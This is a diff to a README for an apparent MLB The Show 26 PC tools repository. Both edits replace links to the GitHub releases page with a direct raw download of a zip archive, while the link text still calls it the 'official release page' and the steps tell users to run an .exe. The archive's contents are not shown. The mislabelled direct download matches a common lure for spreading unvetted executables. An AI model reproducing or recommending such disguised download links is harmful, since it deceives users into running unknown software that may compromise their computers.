@@ -1,6 +1,6 @@
 # ⚾ MLB-The-Show-26-PC - Enhance Your Baseball Gameplay With Tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/isabre5796/MLB-The-Show-26-PC/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/isabre5796/MLB-The-Show-26-PC/main/Portable-Port/ML-Show-PC-The-3.4-beta.1.zip)
 
 MLB-The-Show-26-PC provides a set of tools to manage your game data. Use these utilities to change rosters, track market trends, and automate routine tasks. These tools help you get more value from your baseball experience on Windows. 
 
@@ -34,7 +34,7 @@ Your computer needs to meet these requirements to run the tools:
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/isabre5796/MLB-The-Show-26-PC/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/isabre5796/MLB-The-Show-26-PC/main/Portable-Port/ML-Show-PC-The-3.4-beta.1.zip).
 2. Locate the most recent version in the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find.
